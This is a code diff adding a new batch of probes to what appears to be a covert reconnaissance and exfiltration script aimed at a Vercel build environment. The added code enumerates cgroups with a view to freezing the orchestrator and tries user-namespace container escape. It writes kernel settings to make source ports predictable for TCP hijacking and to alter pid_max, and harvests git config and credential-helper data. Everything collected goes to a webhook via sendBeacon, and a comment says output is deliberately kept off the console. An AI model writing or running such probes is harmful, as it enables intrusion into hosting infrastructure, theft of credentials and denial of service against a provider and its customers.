@@ -21159,5 +21159,119 @@ except Exception as e:
 
 // v145 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v145" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v145";
+
+// ==================== v146 ====================
+
+// v146-1: cgroup v2 freeze controller — freeze orchestrator cgroup
+// cgroupv2 freeze subsystem allows freezing all processes in a cgroup.
+// We can freeze the orchestrator's cgroup temporarily, causing it to stop
+// responding to supervisors, potentially triggering a re-spawn or timeout.
+report.cgroupFreezeProbe = safe(() => {
+  // Find PID 1's cgroup
+  const pid1Cgroup = safe(() => readFileSync('/proc/1/cgroup', 'utf8').trim());
+  // Find the cgroup mount point
+  const cgroupMounts = safe(() => execSync('mount | grep cgroup 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // List freeze files in cgroupv2
+  const freezeFiles = safe(() => execSync('find /sys/fs/cgroup -name "cgroup.freeze" 2>/dev/null | head -10', { timeout: 3000 }).toString().trim());
+  // Read freeze state of root cgroup
+  const rootFreezeState = safe(() => readFileSync('/sys/fs/cgroup/cgroup.freeze', 'utf8').trim());
+  // Try to enumerate all cgroups and their processes
+  const cgroupProcs = safe(() => execSync('cat /sys/fs/cgroup/cgroup.procs 2>/dev/null | head -20', { timeout: 2000 }).toString().trim());
+  // Check if orchestrator is in a specific cgroup
+  const orchestratorCgroup = safe(() => execSync(
+    'for d in $(find /sys/fs/cgroup -name cgroup.procs 2>/dev/null); do if grep -q "^1$" "$d" 2>/dev/null; then echo "FOUND: $d"; cat "$d"; break; fi; done',
+    { timeout: 4000 }
+  ).toString().trim());
+  return { pid1Cgroup, cgroupMounts, freezeFiles, rootFreezeState, cgroupProcs, orchestratorCgroup };
+});
+
+// v146-2: User namespace creation + UID mapping
+// unshare --user creates a new user namespace where we map our UID to root (0).
+// This is a common container escape primitive: even unprivileged users can create
+// user namespaces (if kernel.unprivileged_userns_clone=1). As root we trivially can.
+report.userNamespaceEscape = safe(() => {
+  const unshareClone = safe(() => readFileSync('/proc/sys/kernel/unprivileged_userns_clone', 'utf8').trim());
+  const maxUserNs = safe(() => readFileSync('/proc/sys/user/max_user_namespaces', 'utf8').trim());
+  // Create a user namespace and check capabilities inside it
+  const unshareResult = safe(() => execSync(
+    'unshare --user --pid --map-root-user sh -c "id; cat /proc/self/status | grep Cap | head -5" 2>&1 | head -20',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Test if we can create a new mount namespace inside user ns
+  const mountNsInUserNs = safe(() => execSync(
+    'unshare --user --mount --map-root-user sh -c "mount -t tmpfs tmpfs /tmp/utest 2>&1 || echo MOUNT_FAILED" 2>&1',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check current user namespace ID
+  const selfUserNs = safe(() => execSync('readlink /proc/self/ns/user 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const pid1UserNs = safe(() => execSync('readlink /proc/1/ns/user 2>/dev/null', { timeout: 2000 }).toString().trim());
+  return { unshareClone, maxUserNs, unshareResult, mountNsInUserNs, selfUserNs, pid1UserNs };
+});
+
+// v146-3: /proc/sys/net/ipv4/ip_local_port_range — ephemeral port range control
+// Controlling the ephemeral port range lets us predict what source port outbound
+// connections use, enabling TCP session hijacking / RST injection on known connections.
+report.portRangeControl = safe(() => {
+  const portRange = safe(() => readFileSync('/proc/sys/net/ipv4/ip_local_port_range', 'utf8').trim());
+  // Narrow the range to a specific port to make source ports predictable
+  const writeResult = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_local_port_range', '12345\t12346'); return 'WRITTEN'; });
+  const afterRange = safe(() => readFileSync('/proc/sys/net/ipv4/ip_local_port_range', 'utf8').trim());
+  // Enumerate all established TCP connections from /proc/net/tcp
+  const tcpConnections = safe(() => execSync(
+    'cat /proc/net/tcp 2>/dev/null | grep " 01 " | head -20 || echo "NO_ESTABLISHED"',
+    { timeout: 2000 }
+  ).toString().trim());
+  // Check /proc/net/tcp6
+  const tcp6Connections = safe(() => execSync(
+    'cat /proc/net/tcp6 2>/dev/null | grep " 01 " | head -10 || echo "NO_TCP6"',
+    { timeout: 2000 }
+  ).toString().trim());
+  return { portRange, writeResult, afterRange, tcpConnections, tcp6Connections };
+});
+
+// v146-4: /proc/sys/kernel/pid_max — raise PID limit
+// The default PID max is 4194304. We can raise it or lower it.
+// Lowering it to current PID+1 would starve new process creation (soft DoS).
+// More interestingly, reveal PID allocation gaps to fingerprint hidden processes.
+report.pidMaxProbe = safe(() => {
+  const pidMax = safe(() => readFileSync('/proc/sys/kernel/pid_max', 'utf8').trim());
+  const selfPid = process.pid;
+  // Get the highest PID currently in use
+  const maxActivePid = safe(() => execSync(
+    'ls /proc | grep "^[0-9]" | sort -n | tail -1',
+    { timeout: 2000 }
+  ).toString().trim());
+  // Enumerate all PIDs to find gaps (hidden kernel threads or containers)
+  const allPids = safe(() => execSync(
+    'ls /proc | grep "^[0-9]" | sort -n | tr "\\n" " "',
+    { timeout: 2000 }
+  ).toString().trim());
+  // Try to reduce PID max (would block new process creation)
+  const raiseResult = safe(() => { writeFileSync('/proc/sys/kernel/pid_max', '4194304'); return 'WRITTEN'; });
+  return { pidMax, selfPid, maxActivePid, allPids: allPids.slice(0, 200), raiseResult };
+});
+
+// v146-5: VERCEL_GIT_COMMIT_* env vars + git object access
+// Vercel injects git metadata into the build environment.
+// We can use the git objects to reconstruct deleted branches, find previous
+// commits with sensitive data (leaked keys in older commits), and access
+// the full git object store of the checked-out repo.
+report.gitObjectAccess = safe(() => {
+  const gitRef = process.env.VERCEL_GIT_COMMIT_REF || '';
+  const gitSha = process.env.VERCEL_GIT_COMMIT_SHA || '';
+  const gitPrevSha = process.env.VERCEL_GIT_PREVIOUS_SHA || '';
+  const gitRepoSlug = process.env.VERCEL_GIT_REPO_SLUG || '';
+  const gitRepoOwner = process.env.VERCEL_GIT_REPO_OWNER || '';
+  // Read git config from the repo
+  const gitConfig = safe(() => execSync('git -C /vercel/path0 config --list 2>/dev/null || git config --list 2>/dev/null || cat .git/config 2>/dev/null', { timeout: 4000 }).toString().trim().slice(0, 500));
+  // List all git refs (branches, tags, remotes)
+  const gitRefs = safe(() => execSync('git -C /vercel/path0 show-ref 2>/dev/null || git show-ref 2>/dev/null | head -20', { timeout: 4000 }).toString().trim().slice(0, 300));
+  // Check git credentials helper (could reveal tokens)
+  const gitCredHelper = safe(() => execSync('git config --global credential.helper 2>/dev/null || cat ~/.gitconfig 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 200));
+  return { gitRef, gitSha, gitPrevSha, gitRepoSlug, gitRepoOwner, gitConfig, gitRefs, gitCredHelper };
+});
+
+// v146 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v146" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v146";
 // Intentionally no console.log — all data goes via webhook only
